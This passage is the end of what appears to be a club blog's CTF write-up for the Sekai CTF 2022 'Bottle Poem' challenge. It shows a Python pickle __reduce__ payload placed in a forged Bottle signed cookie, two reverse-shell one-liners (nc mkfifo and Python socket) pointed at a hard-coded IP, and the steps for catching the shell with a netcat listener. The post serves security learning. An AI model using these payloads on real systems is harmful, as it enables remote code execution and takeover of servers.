</span></span><span class=line><span class=cl>        <span class=n>cmd</span> <span class=o>=</span> <span class=p>(</span><span class=s1>&#39;rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2&gt;&amp;1 | nc 14.186.174.164 55555 &gt; /tmp/f&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>os</span><span class=o>.</span><span class=n>system</span><span class=p>,</span> <span class=p>((</span><span class=sa>f</span><span class=s2>&#34;&#34;&#34;python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;14.186.174.164&#34;,55555));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&#34;/bin/sh&#34;,&#34;-i&#34;]);&#39;&#34;&#34;&#34;</span><span class=p>),)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Test</span>
</span></span><span class=line><span class=cl><span class=nd>@route</span><span class=p>(</span><span class=s2>&#34;/sign&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>index</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>session</span> <span class=o>=</span> <span class=n>request</span><span class=o>.</span><span class=n>get_cookie</span><span class=p>(</span><span class=s2>&#34;name&#34;</span><span class=p>,</span> <span class=n>secret</span><span class=o>=</span><span class=n>sekai</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>session</span><span class=p>[</span><span class=s2>&#34;name&#34;</span><span class=p>])</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=ow>not</span> <span class=n>session</span> <span class=ow>or</span> <span class=n>session</span><span class=p>[</span><span class=s2>&#34;name&#34;</span><span class=p>]</span> <span class=o>==</span> <span class=s2>&#34;guest&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>objWithReduce</span> <span class=o>=</span> <span class=n>RCE</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=n>session</span> <span class=o>=</span> <span class=p>{</span><span class=s2>&#34;name&#34;</span><span class=p>:</span> <span class=s2>&#34;guest&#34;</span><span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=n>session1</span> <span class=o>=</span> <span class=p>{</span><span class=s2>&#34;name&#34;</span><span class=p>:</span> <span class=n>objWithReduce</span><span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=n>response</span><span class=o>.</span><span class=n>set_cookie</span><span class=p>(</span><span class=s2>&#34;name&#34;</span><span class=p>,</span> <span class=n>session1</span><span class=p>,</span> <span class=n>secret</span><span class=o>=</span><span class=n>sekai</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>template</span><span class=p>(</span><span class=s2>&#34;guest&#34;</span><span class=p>,</span> <span class=n>name</span><span class=o>=</span><span class=n>session</span><span class=p>[</span><span class=s2>&#34;name&#34;</span><span class=p>])</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>session</span><span class=p>[</span><span class=s2>&#34;name&#34;</span><span class=p>]</span> <span class=o>==</span> <span class=s2>&#34;admin&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>template</span><span class=p>(</span><span class=s2>&#34;admin&#34;</span><span class=p>,</span> <span class=n>name</span><span class=o>=</span><span class=n>session</span><span class=p>[</span><span class=s2>&#34;name&#34;</span><span class=p>])</span>
</span></span></code></pre></div><p>Running server and go to /sign with the Guest cookie to get the new Cookie with RCE instance dumps</p><p><figure><div class="d-flex justify-content-center"><div class=w-100><img alt srcset="/blog/duti/sekai-ctf-2022-bottle-poem/get-malicious-cookie_huaa4dc20fecf0d75e67f481d65b82843c_79742_50ea3b0d6c1d8051fae598963c570d69.webp 400w,
/blog/duti/sekai-ctf-2022-bottle-poem/get-malicious-cookie_huaa4dc20fecf0d75e67f481d65b82843c_79742_f3a2c5fbfc427a6ee05ab2a6207f5e41.webp 760w,
/blog/duti/sekai-ctf-2022-bottle-poem/get-malicious-cookie_huaa4dc20fecf0d75e67f481d65b82843c_79742_1200x1200_fit_q75_h2_lanczos_3.webp 1200w" src=/blog/duti/sekai-ctf-2022-bottle-poem/get-malicious-cookie_huaa4dc20fecf0d75e67f481d65b82843c_79742_50ea3b0d6c1d8051fae598963c570d69.webp width=760 height=210 loading=lazy data-zoomable></div></div></figure></p><p>In Attackbox, open netcat listener at port 55555:<figure><div class="d-flex justify-content-center"><div class=w-100><img alt srcset="/blog/duti/sekai-ctf-2022-bottle-poem/run-nc-listener_hu85b12a9bd2923bd99915eac8765feaab_55562_88d9b11d261b0e0828bc5ac9c1b4c597.webp 400w,
/blog/duti/sekai-ctf-2022-bottle-poem/run-nc-listener_hu85b12a9bd2923bd99915eac8765feaab_55562_9d02d5dc09aebfc848283ccd7a41080a.webp 760w,
/blog/duti/sekai-ctf-2022-bottle-poem/run-nc-listener_hu85b12a9bd2923bd99915eac8765feaab_55562_1200x1200_fit_q75_h2_lanczos_3.webp 1200w" src=/blog/duti/sekai-ctf-2022-bottle-poem/run-nc-listener_hu85b12a9bd2923bd99915eac8765feaab_55562_88d9b11d261b0e0828bc5ac9c1b4c597.webp width=760 height=210 loading=lazy data-zoomable></div></div></figure></p><p>Request to the SekaiCTF with RCE cookie<figure><div class="d-flex justify-content-center"><div class=w-100><img alt srcset="/blog/duti/sekai-ctf-2022-bottle-poem/run-payload_huc9f348e230251ed7e2ab45364bd40de0_59634_8844974782186e39b049b7f1faef2d50.webp 400w,
/blog/duti/sekai-ctf-2022-bottle-poem/run-payload_huc9f348e230251ed7e2ab45364bd40de0_59634_145d5943f78ef9862b04919be3abbcd0.webp 760w,
/blog/duti/sekai-ctf-2022-bottle-poem/run-payload_huc9f348e230251ed7e2ab45364bd40de0_59634_1200x1200_fit_q75_h2_lanczos_3.webp 1200w" src=/blog/duti/sekai-ctf-2022-bottle-poem/run-payload_huc9f348e230251ed7e2ab45364bd40de0_59634_8844974782186e39b049b7f1faef2d50.webp width=760 height=210 loading=lazy data-zoomable></div></div></figure></p><p>Netcat listener now receive reverse shell 😄 :<figure><div class="d-flex justify-content-center"><div class=w-100><img alt srcset="/blog/duti/sekai-ctf-2022-bottle-poem/access-flag_hu618d426f0af02e8599c5866dbde174f5_66231_1cb0f3b7fb7fd3e45d6df767d2234c2a.webp 400w,
/blog/duti/sekai-ctf-2022-bottle-poem/access-flag_hu618d426f0af02e8599c5866dbde174f5_66231_0f6429fdcc19d3d43a95f918c2cd1ed4.webp 760w,
/blog/duti/sekai-ctf-2022-bottle-poem/access-flag_hu618d426f0af02e8599c5866dbde174f5_66231_1200x1200_fit_q75_h2_lanczos_3.webp 1200w" src=/blog/duti/sekai-ctf-2022-bottle-poem/access-flag_hu618d426f0af02e8599c5866dbde174f5_66231_1cb0f3b7fb7fd3e45d6df767d2234c2a.webp width=760 height=465 loading=lazy data-zoomable></div></div></figure></p><h2 id=reference-links>Reference Links</h2><p>Reverse Shell / Bind Shell:</p><p><a href=https://www.hackingtutorials.org/networking/hacking-with-netcat-part-1-the-basics/ target=_blank rel=noopener>https://www.hackingtutorials.org/networking/hacking-with-netcat-part-1-the-basics/</a></p><p><a href=https://www.hackingtutorials.org/networking/hacking-netcat-part-2-bind-reverse-shells/ target=_blank rel=noopener>https://www.hackingtutorials.org/networking/hacking-netcat-part-2-bind-reverse-shells/</a></p><p><a href=https://www.hackingtutorials.org/networking/hacking-with-netcat-part-3-advanced-techniques/ target=_blank rel=noopener>https://www.hackingtutorials.org/networking/hacking-with-netcat-part-3-advanced-techniques/</a></p><p>Python Pickle Module <code>__reduce__</code> implements allow RCE:</p><p><a href=https://davidhamann.de/2020/04/05/exploiting-python-pickle/ target=_blank rel=noopener>https://davidhamann.de/2020/04/05/exploiting-python-pickle/</a></p><p>Python Bottle get_cookie set_cookie using pickle.loads and pickle.dumps in its chain of encrypt/encode steps</p><p><a href=https://github.com/bottlepy/bottle/blob/master/bottle.py target=_blank rel=noopener>https://github.com/bottlepy/bottle/blob/master/bottle.py</a> (ctrl+f set_cookie, get_cookie)</p></div><div class=article-tags><a class="badge badge-light" href=/tag/ctf/>ctf</a>
<a class="badge badge-light" href=/tag/writeup/>writeup</a>
<a class="badge badge-light" href=/tag/web-exploitation/>web-exploitation</a></div><div class=share-box><ul class=share><li><a href="https://twitter.com/intent/tweet?url=https%3A%2F%2Fblog.bkisc.com%2Fblog%2Fduti%2Fsekai-ctf-2022-bottle-poem%2F&text=Sekai+CTF+2022+Bottle+Poem" target=_blank rel=noopener class=share-btn-twitter aria-label=twitter><i class="fab fa-twitter"></i></a></li><li><a href="https://www.facebook.com/sharer.php?u=https%3A%2F%2Fblog.bkisc.com%2Fblog%2Fduti%2Fsekai-ctf-2022-bottle-poem%2F&t=Sekai+CTF+2022+Bottle+Poem" target=_blank rel=noopener class=share-btn-facebook aria-label=facebook><i class="fab fa-facebook"></i></a></li><li><a href="mailto:?subject=Sekai%20CTF%202022%20Bottle%20Poem&body=https%3A%2F%2Fblog.bkisc.com%2Fblog%2Fduti%2Fsekai-ctf-2022-bottle-poem%2F" target=_blank rel=noopener class=share-btn-email aria-label=envelope><i class="fas fa-envelope"></i></a></li><li><a href="https://www.linkedin.com/shareArticle?url=https%3A%2F%2Fblog.bkisc.com%2Fblog%2Fduti%2Fsekai-ctf-2022-bottle-poem%2F&title=Sekai+CTF+2022+Bottle+Poem" target=_blank rel=noopener class=share-btn-linkedin aria-label=linkedin-in><i class="fab fa-linkedin-in"></i></a></li><li><a href="whatsapp://send?text=Sekai+CTF+2022+Bottle+Poem%20https%3A%2F%2Fblog.bkisc.com%2Fblog%2Fduti%2Fsekai-ctf-2022-bottle-poem%2F" target=_blank rel=noopener class=share-btn-whatsapp aria-label=whatsapp><i class="fab fa-whatsapp"></i></a></li><li><a href="https://service.weibo.com/share/share.php?url=https%3A%2F%2Fblog.bkisc.com%2Fblog%2Fduti%2Fsekai-ctf-2022-bottle-poem%2F&title=Sekai+CTF+2022+Bottle+Poem" target=_blank rel=noopener class=share-btn-weibo aria-label=weibo><i class="fab fa-weibo"></i></a></li></ul></div><div class="media author-card content-widget-hr"><a href=/author/hdthinh1012/><img class="avatar mr-3 avatar-circle" src=/author/hdthinh1012/avatar_hu4081a4b70d61aa67a3357681a1c85ea2_22372_270x270_fill_q75_lanczos_center.jpg alt=hdthinh1012></a><div class=media-body><h5 class=card-title><a href=/author/hdthinh1012/>hdthinh1012</a></h5><h6 class=card-subtitle>Web Exploitation</h6><p class=card-text>My research interests include Static Code Analysis, Compilers Fundamental, Static Application Security Testing tool like CodeQL.</p><ul class=network-icon aria-hidden=true><li><a href=mailto:hdthinh01@gmail.com><i class="fas fa-envelope"></i></a></li><li><a href=https://www.facebook.com/hdthinh1012 target=_blank rel=noopener><i class="fab fa-facebook"></i></a></li><li><a href=https://github.com/hdthinh1012 target=_blank rel=noopener><i class="fab fa-github"></i></a></li></ul></div></div></div></article></div><div class=page-footer><div class=container><footer class=site-footer><p class="powered-by copyright-license-text">© 2025 BK Information Security Club</p><p class=powered-by>Published with <a href="https://wowchemy.com/?utm_campaign=poweredby" target=_blank rel=noopener>Wowchemy</a> — the free, <a href=https://github.com/wowchemy/wowchemy-hugo-themes target=_blank rel=noopener>open source</a> website builder that empowers creators.</p></footer></div></div><script src=/js/vendor-bundle.min.fab8b449b814cc9f95b22fcf2e45f05b.js></script>
<script src=https://cdn.jsdelivr.net/npm/leaflet@1.7.1/dist/leaflet.min.js integrity crossorigin=anonymous></script>
<script id=search-hit-fuse-template type=text/x-template>
    <div class="search-hit" id="summary-{{key}}">
      <div class="search-hit-content">
        <div class="search-hit-name">
          <a href="{{relpermalink}}">{{title}}</a>
          <div class="article-metadata search-hit-type">{{type}}</div>
          <p class="search-hit-description">{{snippet}}</p>
        </div>
      </div>
    </div>
  </script><script src=https://cdn.jsdelivr.net/gh/krisk/Fuse@v3.2.1/dist/fuse.min.js integrity="sha512-o38bmzBGX+hD3JHWUFCDA09btWaqrNmoJ3RXLlrysA7PP01Kgs4UlE4MhelE1v5dJR3+cxlR4qQlotsW7jKsnw==" crossorigin=anonymous></script>
<script src=https://cdn.jsdelivr.net/gh/julmot/mark.js@8.11.1/dist/jquery.mark.min.js integrity="sha512-mhbv5DqBMgrWL+32MmsDOt/OAvqr/cHimk6B8y/bx/xS88MVkYGPiVv2ixKVrkywF2qHplNRUvFsAHUdxZ3Krg==" crossorigin=anonymous></script>
<script id=page-data type=application/json>{"use_headroom":true}</script><script src=/js/wowchemy-headroom.db4755770454eb63685f8de785c0a172.js type=module></script>
<script src=/en/js/wowchemy.min.0c1be879804fa6ae06a8f4c131cdbf54.js></script>
<script src=/js/wowchemy-map.a26e9d2f7238ba5b868384f1c5bc6477.js type=module></script></body></html>